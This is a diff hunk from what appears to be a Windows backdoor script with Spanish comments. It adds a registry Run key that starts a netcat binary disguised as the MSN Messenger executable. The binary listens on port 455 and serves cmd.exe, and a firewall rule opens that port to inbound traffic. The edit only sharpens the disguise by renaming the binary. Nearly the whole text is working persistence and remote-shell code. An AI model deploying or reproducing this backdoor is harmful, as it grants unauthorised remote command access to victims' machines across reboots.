@@ -29,7 +29,7 @@
 
 
     # ARRANQUE AL INICIO DEL SISTEMA
-    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\msnmsg.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f
+    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v nc /d "C:\Windows\System32\msnmsgr.exe -Ldp 455 -e cmd.exe" /t REG_SZ /f
 
     # //ACTIVAR PERSIMOS DE FIREWALL
     netsh advfirewall firewall add rule name="Service Firewall" dir=in action=allow protocol=TCP localport=455 enable=yes
